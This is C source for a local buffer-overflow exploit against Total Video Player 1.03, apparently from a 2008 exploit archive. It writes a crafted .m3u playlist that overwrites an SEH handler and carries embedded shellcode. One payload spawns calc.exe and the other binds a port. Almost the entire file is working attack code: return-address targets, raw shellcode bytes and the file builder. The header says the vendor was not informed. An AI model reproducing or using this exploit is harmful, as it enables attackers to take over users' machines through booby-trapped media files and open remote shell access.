/*0day Total Video Player V1.03 .m3u file Local Buffer Overflow

In this exploit you chose to bind a port or to spawn calc.exe.
After I crafted a playlist I observed that the stack got corrupted.
The corruption accured in some points,and overwriten a seh handler.
I managed to get control of the ECX register after a ~800 byte buffer
overflowed.The EIP register was overwriten after 849 bytes,and if more
you ca get control to ESI as also.I think that this is the correct 
order,anyways to overwrite the EIP register was enought to can exploit
the program and modifie execution. 
Credits for finding this bug go to fl0 fl0w,exploit by fl0 fl0w.
Special thanks to Expanders !!!!  

Usage
You can chose a RET address ,I put some addresses from the program's 
dll's ,and might not be the same on yours,but there are other universal
addresses there as also.
Btw vendor hasn't been informed.
If you have a question or something ,feel free to contact me at flo_flow_supremacy@yahoo.com.
*/

#include<stdio.h>
#include <stdlib.h>
#include <string.h>
#include<windows.h>


#define PRE "#EXTM3U\r\n#EXTINF:3:36,Every you every me(Single Mix)\r\nC:\\"
#define POST ".mp3\x0d\x0a"
#define M3Ufile "TesTFile.m3u"
#define SEH_HANDLER 845	 
#define NEXT_SEH    841

struct retcodes{char *platform;unsigned long addr;} targets[]= 
{       
 
        { "Vcen.dll"             , 0x0135105A },  
        { "TVP TVPlayList.dll"   , 0x013A1DEF },
        { "Windows NT SP 5/6"    , 0x776a1082 },   // ws2help.dll pop esi, pop ebx, retn  [Tnx to metasploit]
	    { "Windows 2k Universal" , 0x750211a9 },   // ws2help.dll pop ebp, pop ebx, retn  [Tnx to metasploit]
     	{ "Windows XP Universal" , 0x71abe325 },   // ws2help.dll pop ebx, pop ebp, retn  [Tnx to metasploit]
     	{ NULL } 
};
//shellcode from metasploit
char scz[]=
"\x6a\x23\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xec\x61\x0e"
"\x31\x83\xeb\xfc\xe2\xf4\x10\x89\x4a\x31\xec\x61\x85\x74\xd0\xea"
"\x72\x34\x94\x60\xe1\xba\xa3\x79\x85\x6e\xcc\x60\xe5\x78\x67\x55"
"\x85\x30\x02\x50\xce\xa8\x40\xe5\xce\x45\xeb\xa0\xc4\x3c\xed\xa3"
"\xe5\xc5\xd7\x35\x2a\x35\x99\x84\x85\x6e\xc8\x60\xe5\x57\x67\x6d"
"\x45\xba\xb3\x7d\x0f\xda\x67\x7d\x85\x30\x07\xe8\x52\x15\xe8\xa2"
"\x3f\xf1\x88\xea\x4e\x01\x69\xa1\x76\x3d\x67\x21\x02\xba\x9c\x7d"
"\xa3\xba\x84\x69\xe5\x38\x67\xe1\xbe\x31\xec\x61\x85\x59\xd0\x3e"
"\x3f\xc7\x8c\x37\x87\xc9\x6f\xa1\x75\x61\x84\x8e\xc0\xd1\x8c\x09"
"\x96\xcf\x66\x6f\x59\xce\x0b\x02\x6f\x5d\x8f\x4f\x6b\x49\x89\x61"
"\x0e\x31";
//shellcode
char scz2[]="\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x50"
"\x8a\xfa\x90\x83\xeb\xfc\xe2\xf4\xac\xe0\x11\xdd\xb8\x73\x05\x6f"
"\xaf\xea\x71\xfc\x74\xae\x71\xd5\x6c\x01\x86\x95\x28\x8b\x15\x1b"
"\x1f\x92\x71\xcf\x70\x8b\x11\xd9\xdb\xbe\x71\x91\xbe\xbb\x3a\x09"
"\xfc\x0e\x3a\xe4\x57\x4b\x30\x9d\x51\x48\x11\x64\x6b\xde\xde\xb8"
"\x25\x6f\x71\xcf\x74\x8b\x11\xf6\xdb\x86\xb1\x1b\x0f\x96\xfb\x7b"
"\x53\xa6\x71\x19\x3c\xae\xe6\xf1\x93\xbb\x21\xf4\xdb\xc9\xca\x1b"
"\x10\x86\x71\xe0\x4c\x27\x71\xd0\x58\xd4\x92\x1e\x1e\x84\x16\xc0"
"\xaf\x5c\x9c\xc3\x36\xe2\xc9\xa2\x38\xfd\x89\xa2\x0f\xde\x05\x40"
"\x38\x41\x17\x6c\x6b\xda\x05\x46\x0f\x03\x1f\xf6\xd1\x67\xf2\x92"
"\x05\xe0\xf8\x6f\x80\xe2\x23\x99\xa5\x27\xad\x6f\x86\xd9\xa9\xc3"
"\x03\xd9\xb9\xc3\x13\xd9\x05\x40\x36\xe2\xeb\xcc\x36\xd9\x73\x71"
"\xc5\xe2\x5e\x8a\x20\x4d\xad\x6f\x86\xe0\xea\xc1\x05\x75\x2a\xf8"
"\xf4\x27\xd4\x79\x07\x75\x2c\xc3\x05\x75\x2a\xf8\xb5\xc3\x7c\xd9"
"\x07\x75\x2c\xc0\x04\xde\xaf\x6f\x80\x19\x92\x77\x29\x4c\x83\xc7"
"\xaf\x5c\xaf\x6f\x80\xec\x90\xf4\x36\xe2\x99\xfd\xd9\x6f\x90\xc0"
"\x09\xa3\x36\x19\xb7\xe0\xbe\x19\xb2\xbb\x3a\x63\xfa\x74\xb8\xbd"
"\xae\xc8\xd6\x03\xdd\xf0\xc2\x3b\xfb\x21\x92\xe2\xae\x39\xec\x6f"
"\x25\xce\x05\x46\x0b\xdd\xa8\xc1\x01\xdb\x90\x91\x01\xdb\xaf\xc1"
"\xaf\x5a\x92\x3d\x89\x8f\x34\xc3\xaf\x5c\x90\x6f\xaf\xbd\x05\x40"
"\xdb\xdd\x06\x13\x94\xee\x05\x46\x02\x75\x2a\xf8\x2e\x52\x18\xe3"
"\x03\x75\x2c\x6f\x80\x8a\xfa\x90";
 
char jmpover[]=
// 2 bytes jump 4 bytes over - 2 bytes NOP
"\xEb\x04\x90\x90";

int main(int argc, char *argv[])
{ FILE *f;
  unsigned char *buffer;
  unsigned int offset=0;
  int i;
  if(argc < 2){
          printf(" Credits for finding bug go to fl0 fl0w\n");
          printf(" Exploit fl0 fl0w | Special Thanks to Expanders\n\n");
          printf("#   \t Platform\n"); 
          printf("-----------------------------------------------\n");
          for(i = 0; targets[i].platform; i++)
                printf("%d \t %s\n",i,targets[i].platform);
          printf("-----------------------------------------------\n");
          exit(0);
  }
  printf("{1} Spawn Calc.exe\n");
  printf("{2} Bind port \n");
  unsigned int retaddress=targets[atoi(argv[1])].addr;
    int input;
    scanf("%d",&input);
    switch(input)
    { 
                 case 1: 
   buffer=(unsigned char*)malloc(SEH_HANDLER+4+strlen(scz)+1+16);
   if((f=fopen(M3Ufile,"wb"))==NULL) { printf("Error ! file not created\n"); exit(0); }
    
     printf("Building file...\n");
     memset(buffer,0x90,SEH_HANDLER+4+strlen(scz)+1+16);
     offset=NEXT_SEH;
       
     memcpy(buffer+offset,jmpover,strlen(jmpover));  
     offset=SEH_HANDLER;  
     memcpy(buffer+offset,&retaddress,4); offset+=4;
     offset+=16;
    
    memcpy(buffer+offset,scz,strlen(scz));
    offset+=strlen(scz);
    memset(buffer+offset,0x00,1);
    
                                  fprintf(f,"%s%s%s",PRE,buffer,POST); 
                                  printf("File build  :)  \n");
                                  fclose(f);
                 break;

                 case 2:
     buffer=(unsigned char*)malloc(SEH_HANDLER+4+strlen(scz2)+1+16);
     if((f=fopen(M3Ufile,"wb"))==NULL) { printf("Error ! file not created\n"); exit(0); }
     printf("Building file...\n");
     memset(buffer,0x90,SEH_HANDLER+4+strlen(scz2)+1+16);

     offset=NEXT_SEH;
     memcpy(buffer+offset,jmpover,strlen(jmpover));  
    
     offset=SEH_HANDLER;  
     memcpy(buffer+offset,&retaddress,4); offset+=4;
     offset+=16;
    
     memcpy(buffer+offset,scz2,strlen(scz2));
     offset+=strlen(scz2);
     memset(buffer+offset,0x00,1);
    
                                  fprintf(f,"%s%s%s",PRE,buffer,POST); 
                                  printf("File build  :)  \n");
                                  fclose(f);
                 break;
    }
return 0;
  }

// milw0rm.com [2008-02-01]
